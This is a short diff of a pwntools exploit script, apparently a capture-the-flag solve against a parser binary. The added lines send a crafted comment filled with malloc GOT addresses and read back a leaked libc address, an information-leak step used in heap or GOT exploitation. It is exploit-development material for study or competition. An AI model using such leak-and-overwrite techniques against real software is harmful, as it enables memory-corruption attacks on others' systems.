@@ -19,6 +19,8 @@ payload = '''begin
 function
 function
 var b = 1;
+var c = 1;
+var d = 2;
 end'''
 
 lines = payload.split('\n')
@@ -26,6 +28,17 @@ print(lines)
 for i in lines:
     io.recvuntil(">")
     io.sendline(i)
+io.sendline('OVER')
+io.recvuntil("size")
+io.sendline(str(0x50))
+io.recvuntil("comment:")
+io.sendline(p64(elf.got['malloc']) + p64(0) * 4 + p64(elf.got['malloc']) + p64(0) * 4)
+io.recvuntil("vadr")
+io.recvuntil("\n")
+libc_addr = myu64(io.recvn(6))
+log.info("\033[33m" + hex(libc_addr) + "\033[0m")
+
+
 gdb.attach(io, '''
 break Analysis::StartAnalysis()
 b Analysis::C(std::_List_iterator<SymInfo>)
@@ -33,11 +46,7 @@ b Analysis::A(std::_List_iterator<SymInfo>)
 b Analysis::H(std::_List_iterator<SymInfo>)
 b Analysis::dumpVar(std::ostream&)
 ''')
-io.sendline('OVER')
-io.recvuntil("size")
-io.sendline(str(0x50))
-io.recvuntil("comment:")
-io.sendline(p64(0xdeadbeef) * 10)
+
 
 
 
